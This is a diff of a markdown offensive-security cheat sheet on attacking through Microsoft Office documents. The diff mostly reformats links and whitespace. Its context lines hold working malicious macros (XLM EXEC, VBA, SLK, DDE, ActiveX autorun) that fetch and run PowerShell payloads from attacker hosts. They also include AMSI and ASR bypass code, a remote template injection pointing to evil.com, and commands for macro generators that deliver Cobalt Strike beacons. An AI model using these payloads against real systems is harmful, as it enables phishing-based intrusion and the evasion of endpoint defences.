@@ -1,4 +1,4 @@
-# Office - Attacks 
+# Office - Attacks
 
 ### Summary
 
@@ -39,11 +39,9 @@
     * [Execute WinAPI](#execute-winapi)
 * [References](#references)
 
-
 ## Office Products Features
 
 ![Overview of features supported by different Office products](https://www.securesystems.de/images/blog/offphish-phishing-revisited-in-2023/Office_documents_feature_overview.png)
-
 
 ## Office Default Passwords
 
@@ -56,14 +54,13 @@ By default, Excel does not set a password when saving a new file. However, some 
 | Excel      | VelvetSweatshop  | all Excel formats |
 | PowerPoint | 01Hannes Ruescher/01 | .pps .ppt     |
 
-
 ## Excel
 
-### XLSM - Hot Manchego 
+### XLSM - Hot Manchego
 
 > When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn't catch a simple lolbas payload to get a beacon on a target machine.
 
-* https://github.com/FortyNorthSecurity/hot-manchego
+* [FortyNorthSecurity/hot-manchego](https://github.com/FortyNorthSecurity/hot-manchego)
 
 ```ps1
 Generate CS Macro and save it to Windows as vba.txt
@@ -76,9 +73,9 @@ PS> .\hot-manchego.exe .\blank.xlsm .\vba.txt
 
 > XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document. This only works for Excel 4.0 macros.
 
-* https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip
-* https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip
-* https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip
+* [michaelweber/Macrome/Macrome-0.3.0-osx-x64.zip](https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip)
+* [michaelweber/Macrome/Macrome-0.3.0-linux-x64.zip](https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip)
+* [michaelweber/Macrome/Macrome-0.3.0-win-x64.zip](https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip)
 
 ```ps1
 # NOTE: The payload cannot contains NULL bytes.
@@ -102,10 +99,9 @@ Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload
 
 When using Macrome build mode, the --password flag may be used to encrypt the generated document using XOR Obfuscation. If the default password of **VelvetSweatshop** is used when building the document, all versions of Excel will automatically decrypt the document without any additional user input. This password can only be set in Excel 2003.
 
-
 ### XLM Excel 4.0 - SharpShooter
 
-* https://github.com/mdsecactivebreach/SharpShooter
+* [mdsecactivebreach/SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)
 
 ```powershell
 # Options
@@ -126,7 +122,6 @@ msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -
 SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --smuggle --template mcafee
 ```
 
-
 ### XLM Excel 4.0 - EXCELntDonut
 
 * XLM (Excel 4.0) macros pre-date VBA and can be delivered in .xls files.
@@ -141,7 +136,7 @@ SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --s
 5. At this point, everything is in column A. To fix that, we'll use the "Text-to-Columns"/"Convert" tool under the "Data" tab.
 6. Highlight column A and open the "Text-to-Columns"  tool. Select "Delimited" and then "Semicolon" on the next screen. Select "Finished".
 7. Right-click on cell A1* and select "Run". This will execute your payload to make sure it works.
-8. To enable auto-execution, we need to rename cell A1* to "Auto_Open". You can do this by clicking into cell A1 and then clicking into the box that says "A1"* just above Column A. Change the text from "A1"* to "Auto_Open". Save the file and verify that auto-execution works.
+8. To enable auto-execution, we need to rename cell A1*to "Auto_Open". You can do this by clicking into cell A1 and then clicking into the box that says "A1"* just above Column A. Change the text from "A1"* to "Auto_Open". Save the file and verify that auto-execution works.
 
 :warning: If you're using the obfuscate flag, after the Text-to-columns operation, your macros won't start in A1. Instead, they'll start at least 100 columns to the right. Scroll horizontally until you see the first cell of text. Let's say that cell is HJ1. If that's the case, then complete steps 6-7 substituting HJ1 for A1
 
@@ -166,21 +161,21 @@ usage: drive.py [-h] --x64bin X64BIN --x86bin X86BIN [-o OUTPUTFILE] [--sandbox]
 python3 drive.py --x64bin GruntHttpx64.bin --x86bin GruntHttpx86.bin
 ```
 
-XLM: https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md
-
+XLM: [Synzack/synzack.github.io/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md](https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md)
 
 ### XLM Excel 4.0 - EXEC
 
 1. Right Click to the current sheet
 2. Insert a **Macro IntL MS Excel 4.0**
 3. Add the `EXEC` macro
+
     ```powershell
     =EXEC("poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg('http://10.10.10.10:80/update.ps1')")
     =halt()
     ```
+
 4. Rename cell to **Auto_open**
 5. Hide your macro worksheet by a right mouse click on the sheet name **Macro1** and selecting **Hide**
-
 
 ### SLK - EXEC
 
@@ -193,7 +188,6 @@ C;X1;Y102;K0;EHALT()
 E
 ```
 
-
 ### XLL - EXEC
 
 An "XLL" file is a type of file used primarily with Microsoft Excel. It stands for "Excel Add-In Library" and is a dynamic link library (DLL) specifically designed to be loaded into Microsoft Excel. These files extend Excel's functionality by adding extra features, functions, or capabilities that are not available in the standard installation of Excel.
@@ -201,6 +195,7 @@ An "XLL" file is a type of file used primarily with Microsoft Excel. It stands f
 :warning: Excel is blocking untrusted XLL add-ins by default
 
 * Compile with: `cl.exe notepadXLL.c /LD /o notepad.xll`
+
     ```c
     #include <Windows.h>
 
@@ -227,7 +222,6 @@ An "XLL" file is a type of file used primarily with Microsoft Excel. It stands f
         return TRUE;
     }
     ```
-
 
 ## Word
 
@@ -261,7 +255,7 @@ End Sub
 
 ### DOCM - Macro Creator
 
-* https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator
+* [Arno0x/PowerShellScripts/MacroCreator](https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator)
 
 ```ps1
 # Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion:
@@ -276,15 +270,13 @@ C:\PS> Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/so
 
 > A message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking the excel document is corrupted.
 
-https://github.com/trustedsec/unicorn
+* [trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
 ```ps1
 python unicorn.py payload.cs cs macro
 ```
 
 ### DOCM - VBA Wscript
-
-> https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office
 
 ```ps1
 Sub parent_change()
@@ -305,7 +297,6 @@ End Sub
 CreateObject("WScript.Shell").Run "calc.exe"
 CreateObject("WScript.Shell").Exec "notepad.exe"
 ```
-
 
 ### DOCM - VBA Shell Execute Comment
 
@@ -329,7 +320,6 @@ Sub AutoOpen()
     beautifulcomment
 End Sub
 ```
-
 
 ### DOCM - VBA Spawning via svchost.exe using Scheduled Task
 
@@ -371,8 +361,8 @@ Sub wmi_exec()
 End Sub
 ```
 
-* https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3
-* https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2
+* [infosecn1nja/ASR Rules Bypass.vba](https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3)
+* <https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2>
 
 ```vb
 Sub ASR_bypass_create_child_process_rule5()
@@ -405,7 +395,7 @@ SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe", "C:\Windows
 
 > Only the community version is available online.
 
-* [https://github.com/sevagas/macro_pack](https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe)
+* [sevagas/macro_pack](https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe)
 
 ```powershell
 # Options
@@ -467,7 +457,7 @@ echo "http://192.168.5.10:8080/x32calc.bin" "http://192.168.5.10:8080/x64calc.bi
 
 > C# based automated Malicous Macro Generator.
 
-* https://github.com/Inf0secRabbit/BadAssMacros
+* [Inf0secRabbit/BadAssMacros](https://github.com/Inf0secRabbit/BadAssMacros)
 
 ```powershell
 BadAssMacros.exe -h
@@ -486,28 +476,28 @@ BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -l
 BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -o <path_to_output_file> -m <module_name>
 ```
 
-
 ### DOCM - CACTUSTORCH VBA Module
 
 > CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript
 
-* https://github.com/mdsecactivebreach/CACTUSTORCH
-* https://github.com/tyranid/DotNetToJScript/
-* CACTUSTORCH - DotNetToJScript all the things - https://youtu.be/YiaKb8nHFSY
-* CACTUSTORCH - CobaltStrike Aggressor Script Addon - https://www.youtube.com/watch?v=_pwH6a-6yAQ
+* [mdsecactivebreach/CACTUSTORCH](https://github.com/mdsecactivebreach/CACTUSTORCH)
+* [tyranid/DotNetToJScript](https://github.com/tyranid/DotNetToJScript)
+* [CACTUSTORCH - DotNetToJScript all the things](https://youtu.be/YiaKb8nHFSY)
+* [CACTUSTORCH - CobaltStrike Aggressor Script Addon](https://www.youtube.com/watch?v=_pwH6a-6yAQ)
 
 1. Import **.cna** in Cobalt Strike
 2. Generate a new VBA payload from the CACTUSTORCH menu
 3. Download DotNetToJscript
-4. Compile it 
+4. Compile it
     * **DotNetToJscript.exe** - responsible for bootstrapping C# binaries (supplied as input) and converting them to JavaScript or VBScript
     * **ExampleAssembly.dll** - the C# assembly that will be given to DotNetToJscript.exe. In default project configuration, the assembly just pops a message box with the text "test"
 5. Execute **DotNetToJscript.exe** and supply it with the ExampleAssembly.dll, specify the output file and the output type
+
     ```ps1
     DotNetToJScript.exeExampleAssembly.dll -l vba -o test.vba -c cactusTorch
     ```
-6. Use the generated code to replace the hardcoded binary in CactusTorch
 
+6. Use the generated code to replace the hardcoded binary in CactusTorch
 
 ### DOCM - MMG with Custom DL + Exec
 
@@ -519,15 +509,15 @@ BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -o <path_to_o
 git clone https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator
 python MMG.py configs/generic-cmd.json malicious.vba
 {
-	"description": "Generic command exec payload\nEvasion technique set to none",
-	"template": "templates/payloads/generic-cmd-template.vba",
-	"varcount": 152,
-	"encodingoffset": 5,
-	"chunksize": 180,
-	"encodedvars": 	{},
-	"vars": 	[],
-	"evasion": 	["encoder"],
-	"payload": "cmd.exe /c C:\\Users\\Public\\beacon.exe"
+ "description": "Generic command exec payload\nEvasion technique set to none",
+ "template": "templates/payloads/generic-cmd-template.vba",
+ "varcount": 152,
+ "encodingoffset": 5,
+ "chunksize": 180,
+ "encodedvars":  {},
+ "vars":  [],
+ "evasion":  ["encoder"],
+ "payload": "cmd.exe /c C:\\Users\\Public\\beacon.exe"
 }
 ```
 
@@ -560,7 +550,7 @@ End Sub
 
 ### DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro
 
-Go to **Developer tab** on ribbon `-> Insert -> More Controls -> Microsoft InkPicture Control` 
+Go to **Developer tab** on ribbon `-> Insert -> More Controls -> Microsoft InkPicture Control`
 
 ```vb
 Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)
@@ -568,25 +558,25 @@ Run = Shell("cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFil
 End Sub
 ```
 
-
 ### VBA Obfuscation
 
 * [bonnetn/vba-obfuscator](https://github.com/bonnetn/vba-obfuscator) [Youtube demo](https://www.youtube.com/watch?v=L0DlPOLx2k0)
-    ```ps1
-    $ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin
-    ```
-* [trustedsec/The_Shelf/spinningteacup](https://github.com/trustedsec/The_Shelf/tree/main/Retired/spinningteacup)
 
+    ```ps1
+    cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin
+    ```
+
+* [trustedsec/The_Shelf/spinningteacup](https://github.com/trustedsec/The_Shelf/tree/main/Retired/spinningteacup)
 
 ### VBA Purging
 
-**VBA Stomping**: This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code. 
+**VBA Stomping**: This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code.
 
 :warning: VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format.
 
 #### OfficePurge
 
-* https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe
+* [fireeye/OfficePurge](https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe)
 
 ```powershell
 OfficePurge.exe -d word -f .\malicious.doc -m NewMacros
@@ -595,10 +585,9 @@ OfficePurge.exe -d publisher -f .\donuts.pub -m ThisDocument
 OfficePurge.exe -d word -f .\malicious.doc -l
 ```
 
-
 #### EvilClippy
 
-> Evil Clippy uses the OpenMCDF library to manipulate CFBF files. 
+> Evil Clippy uses the OpenMCDF library to manipulate CFBF files.
 > Evil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows.
 > If you want to manipulate CFBF files manually, then FlexHEX is one of the best editors for this.
 
@@ -617,30 +606,27 @@ EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc
 EvilClippy.exe -r macrofile.doc
 ```
 
-
 ### VBA - Offensive Security Template
 
-* Reverse Shell VBA - https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba
-* Process Dumper - https://github.com/JohnWoodman/VBA-Macro-Dump-Process
-* RunPE - https://github.com/itm4n/VBA-RunPE
-* Spoof Parent - https://github.com/py7hagoras/OfficeMacro64
-* AMSI Bypass - https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba
-* amsiByPassWithRTLMoveMemory - https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3
-* VBA macro spawning a process with a spoofed parent - https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba
-
+* Reverse Shell VBA - [JohnWoodman/VBA-Macro-Reverse-Shell/VBA-Reverse-Shell.vba](https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba)
+* Process Dumper - [JohnWoodman/VBA-Macro-Dump-Process](https://github.com/JohnWoodman/VBA-Macro-Dump-Process)
+* RunPE - [itm4n/VBA-RunPE](https://github.com/itm4n/VBA-RunPE)
+* Spoof Parent - [py7hagoras/OfficeMacro64](https://github.com/py7hagoras/OfficeMacro64)
+* AMSI Bypass - [outflanknl/AMSIbypasses.vba](https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba)
+* amsiByPassWithRTLMoveMemory - [DanShaqFu/amsiByPassWithRTLMoveMemory.vba](https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3)
+* VBA macro spawning a process with a spoofed parent - [christophetd/spoofing-office-macro/macro64.vba](https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba)
 
 ### VBA - AMSI
 
-> The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/
+> The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. [Office VBA + AMSI: Parting the veil on malicious macros by Microsoft Security Team](https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/)
 
-
-![](https://www.microsoft.com/security/blog/wp-content/uploads/2018/09/fig2-runtime-scanning-amsi-8-1024x482.png)
+![runtime-scanning-amsi](https://www.microsoft.com/security/blog/wp-content/uploads/2018/09/fig2-runtime-scanning-amsi-8-1024x482.png)
 
 :warning: It appears that p-code based attacks where the VBA code is stomped will still be picked up by the AMSI engine (e.g. files manipulated by our tool EvilClippy).
 
 The AMSI engine only hooks into VBA, we can bypass it by using Excel 4.0 Macro
 
-* AMSI Trigger - https://github.com/synacktiv/AMSI-Bypass
+* AMSI Trigger - [synacktiv/AMSI-Bypass](https://github.com/synacktiv/AMSI-Bypass)
 
 ```vb
 Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
@@ -671,7 +657,6 @@ Private Sub Document_Open()
 End Sub
 ```
 
-
 ### DOCX - Template Injection
 
 :warning: Does not require "Enable Macro"
@@ -684,21 +669,23 @@ End Sub
 4. Document from step 3 is renamed to .zip
 5. Document from step 4 gets unzipped
 6. **.\word_rels\settings.xml.rels** contains a reference to the template file. That reference gets replaced with a reference to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb).
+
     ```xml
     <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
     <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///C:\Users\mantvydas\AppData\Roaming\Microsoft\Templates\Polished%20resume,%20designed%20by%20MOO.dotx" TargetMode="External"/></Relationships>
     ```
+
     ```xml
     <?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
     Target="https://evil.com/malicious.dotm" TargetMode="External"/></Relationships>
     ```
-7. File gets zipped back up again and renamed to .docx
 
+7. File gets zipped back up again and renamed to .docx
 
 #### Template Injections Tools
 
-* https://github.com/JohnWoodman/remoteInjector
-* https://github.com/ryhanson/phishery
+* [JohnWoodman/remoteInjector](https://github.com/JohnWoodman/remoteInjector)
+* [ryhanson/phishery](https://github.com/ryhanson/phishery)
 
 ```ps1
 $ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
@@ -708,21 +695,17 @@ $ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
 [*] Injected Word document has been saved!
 ```
 
-
 ### DOCX - DDE
 
 * Insert > QuickPart > Field
 * Right Click > Toggle Field Code
 * `{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" }`
 
-
 ## Visual Studio Tools for Office (VSTO)
 
 A VSTO file is a project file created with Visual Studio Tools for Office, a set of development tools provided by Microsoft for building custom add-ins and solutions for Microsoft Office applications. These projects allow developers to enhance the functionality of Office programs like Excel, Word, and Outlook by integrating additional features, automation, and user interface customizations.
 
 * Visual Studio > `Word 2013 and 2016 VSTO Add-in`
-
-
 
 ## Office Macro Development
 
@@ -735,13 +718,13 @@ Private Declare Function <NAME> Lib "<DLL_NAME>" Alias "<FUNCTION_IMPORTED>" (<B
 ```
 
 If we work on 64bit, we need to add the keyword `PtrSafe` between the keywords `Declare` and `Function`
-Importing the `GetUserNameA` from `advapi32.dll`: 
+Importing the `GetUserNameA` from `advapi32.dll`:
 
 ```vb
 Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
 ```
 
-`GetUserNameA` prototype in C: 
+`GetUserNameA` prototype in C:
 
 ```C
 BOOL GetUserNameA(
@@ -772,38 +755,38 @@ Sub WinAPI()
 End Sub
 ```
 
-
 ## References
 
+* [AMSI in the heap - rmdavy](https://secureyourit.co.uk/wp/2020/04/17/amsi-in-the-heap/)
+* [Analyzing VSTO Office Files - Didier Stevens - April 29, 2022](https://blog.nviso.eu/2022/04/29/analyzing-vsto-office-files/)
+* [Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental](https://www.goggleheadedhacker.com/blog/post/23)
+* [Bypassing AMSI fro VBA - Outflank](https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/)
+* [Dechaining macros and evading EDR - Noora Hyvärinen - 04/04/19](https://blog.f-secure.com/dechaining-macros-and-evading-edr/)
+* [Evil Clippy MS Office Maldoc Assistant - Outflank](https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/)
+* [Excel 4 Macro Generator x86/x64 - bytecod3r](https://bytecod3r.io/excel-4-macro-generator-x86-x64/)
+* [Excel 4.0 Macro Function Reference PDF](https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf)
+* [Excel 4.0 macro old but new - fsx30](https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9)
+* [Excel 4.0 Macros so hot right now - SneekyMonkey](https://www.sneakymonkey.net/2020/06/22/excel-4-0-macros-so-hot-right-now/)
+* [Executing macros from docx with remote - RedXORBlue - July 18, 2018](http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html)
+* [Further evasion in the forgotten corners of ms xls - malware.pizza](https://malware.pizza/2020/06/19/further-evasion-in-the-forgotten-corners-of-ms-xls/)
+* [Inject macro from a remote dotm template - ired.team](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros)
+* [Macros and more with sharpshooter v2.0 - mdsec](https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/)
+* [Make phishing great again. VSTO office files are the new macro nightmare? - Daniel Schell - Apr 14, 2022](https://medium.com/@airlockdigital/make-phishing-great-again-vsto-office-files-are-the-new-macro-nightmare-e09fcadef010)
+* [MS OFFICE FILE FORMAT SORCERY - TROOPERS19 - Pieter Ceelen & Stan Hegt - 21 March 2019](https://github.com/outflanknl/Presentations/blob/master/Troopers19_MS_Office_file_format_sorcery.pdf)
+* [Office VBA AMSI Parting the veil on malicious macros - Microsoft](https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/)
+* [Old schoold evil execl 4.0 macros XLM - Outflank](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/)
+* [One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021](https://adepts.of0x.cc/alternatives-copy-shellcode/)
+* [Phishing SLK - ired.team](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-.slk-excel)bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships)
+* [Phishinh with OLE - ired.team](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk)
+* [PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018](https://www.bitdam.com/2018/05/22/propertybomb-an-old-new-technique-for-arbitrary-code-execution-in-vba-macro/)
+* [Running macros via ActiveX controls - greyhathacker - September 29, 2016](http://www.greyhathacker.net/?p=948)
+* [So you think you can block Macros? - Pieter Ceelen - April 25, 2023](https://outflank.nl/blog/2023/04/25/so-you-think-you-can-block-macros/)
+* [T1137.006 - Office Application Startup: Add-ins - redcanaryco](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.006/T1137.006.md)
 * [VBA RunPE Part 1 - itm4n](https://itm4n.github.io/vba-runpe-part1/)
 * [VBA RunPE Part 2 - itm4n](https://itm4n.github.io/vba-runpe-part2/)
-* [Office VBA AMSI Parting the veil on malicious macros - Microsoft](https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/)
-* [Bypassing AMSI fro VBA - Outflank](https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/)
-* [Evil Clippy MS Office Maldoc Assistant - Outflank](https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/)
-* [Old schoold evil execl 4.0 macros XLM - Outflank](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/)
-* [Excel 4 Macro Generator x86/x64 - bytecod3r](https://bytecod3r.io/excel-4-macro-generator-x86-x64/)
 * [VBad - Pepitoh](https://github.com/Pepitoh/VBad)
-* [Excel 4.0 Macro Function Reference PDF](https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf)
-* [Excel 4.0 Macros so hot right now - SneekyMonkey](https://www.sneakymonkey.net/2020/06/22/excel-4-0-macros-so-hot-right-now/)
-* [Macros and more with sharpshooter v2.0 - mdsec](https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/)
-* [Further evasion in the forgotten corners of ms xls - malware.pizza](https://malware.pizza/2020/06/19/further-evasion-in-the-forgotten-corners-of-ms-xls/)
-* [Excel 4.0 macro old but new - fsx30](https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9)
-* [XLS 4.0 macros and covenant - d-sec](https://d-sec.net/2020/10/24/xls-4-0-macros-and-covenant/)
-* [Inject macro from a remote dotm template - ired.team](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros)
-* [Phishinh with OLE - ired.team](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk)
-* [Phishing SLK - ired.team](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-.slk-excel)bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships)
-* [PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018](https://www.bitdam.com/2018/05/22/propertybomb-an-old-new-technique-for-arbitrary-code-execution-in-vba-macro/)
-* [AMSI in the heap - rmdavy](https://secureyourit.co.uk/wp/2020/04/17/amsi-in-the-heap/)
-* [WordAMSIBypass - rmdavy](https://github.com/rmdavy/WordAmsiBypass)
-* [Dechaining macros and evading EDR - Noora Hyvärinen - 04/04/19](https://blog.f-secure.com/dechaining-macros-and-evading-edr/)
-* [Executing macros from docx with remote - RedXORBlue - July 18, 2018](http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html)
-* [One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021](https://adepts.of0x.cc/alternatives-copy-shellcode/)
-* [Running macros via ActiveX controls - greyhathacker - September 29, 2016](http://www.greyhathacker.net/?p=948)
-* [Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental](https://www.goggleheadedhacker.com/blog/post/23)
-* [So you think you can block Macros? - Pieter Ceelen - April 25, 2023](https://outflank.nl/blog/2023/04/25/so-you-think-you-can-block-macros/)
-* [MS OFFICE FILE FORMAT SORCERY - TROOPERS19 - Pieter Ceelen & Stan Hegt - 21 March 2019 ](https://github.com/outflanknl/Presentations/blob/master/Troopers19_MS_Office_file_format_sorcery.pdf)
 * [VenomousSway - VBA payload generation framework / Retired TrustedSec Capabilities - Trustedsec - May 22, 2024](https://github.com/trustedsec/The_Shelf/tree/main/Retired/venomoussway)
-* [T1137.006 - Office Application Startup: Add-ins - redcanaryco](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.006/T1137.006.md)
 * [VSTO: THE PAYLOAD INSTALLER THAT PROBABLY DEFEATS YOUR APPLICATION WHITELISTING RULES - BOHOPS - JANUARY 31, 2018](https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/)
-* [Make phishing great again. VSTO office files are the new macro nightmare? - Daniel Schell - Apr 14, 2022](https://medium.com/@airlockdigital/make-phishing-great-again-vsto-office-files-are-the-new-macro-nightmare-e09fcadef010)
-* [Analyzing VSTO Office Files - Didier Stevens - April 29, 2022](https://blog.nviso.eu/2022/04/29/analyzing-vsto-office-files/)
+* [Windows Defender Exploit Guard ASR Rules for Office - Carlos Perez - November 14, 2017](https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office)
+* [WordAMSIBypass - rmdavy](https://github.com/rmdavy/WordAmsiBypass)
+* [XLS 4.0 macros and covenant - d-sec](https://d-sec.net/2020/10/24/xls-4-0-macros-and-covenant/)
